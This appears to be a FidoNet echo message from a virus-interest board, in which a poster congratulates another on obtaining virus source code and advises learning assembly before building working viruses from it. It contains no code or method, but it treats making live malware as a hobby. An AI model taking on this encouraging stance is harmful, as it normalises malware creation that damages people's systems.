Good for you! These kinds of "windows of opportunity" open
seldom, and we need to take whatever advantage of them we can.
There was a spate of submissions of source code some time ago
(two years?), but these things don't happen often.

ML> Are you into to viruses or just seeing how to stay ahead of them??

I've been a programmer for a long time, and I've always been
interested in how a program achieves an unusual effect. I'm
treating viruses as another source of education/entertainment.
The entertainment part comes from watching the fast footwork of
some of the folks on these virus echoes, as they try to give the
impression of providing adequate answers to peoples' questions
while avoiding telling them anything important about what's
really going on down in the innards of viruses.

From your message, I gather that you're not very heavily into
assembly language yet. I would suggest that you give it some
serious study before you start making working viruses out of
those sources. Even for those written in C or Pascal, serious
knowledge of what's going on down at the machine level is
important to any deep understanding of virus behavior. Your
disks will thank you for extra caution!

        Happy exploration,

                Brad

 * OLX 2.1 TD * "A believes x" is not a function of x.


-+- WM v2.09/91-0245
 + Origin: NETIS Public Access Internet (603)432-2517 (1:132/189)
=============================================================================

Yoo-hooo-oo, -!


    ■ The Me┬eO

/c            Lower case significant in symbols

--- Aidstest Null: /Kill
 * Origin: ∙PVT.ViRII·main·board· / Virus Research labs. (2:5030/136)
SEEN-BY: 463/707 465/1 10 11 23 46 57 60 666 4651/1 4653/1 4657/3 5020/52
SEEN-BY: 5020/221 5030/48 84 96 136 170 179
.PATH: 5030/136 465/10 23

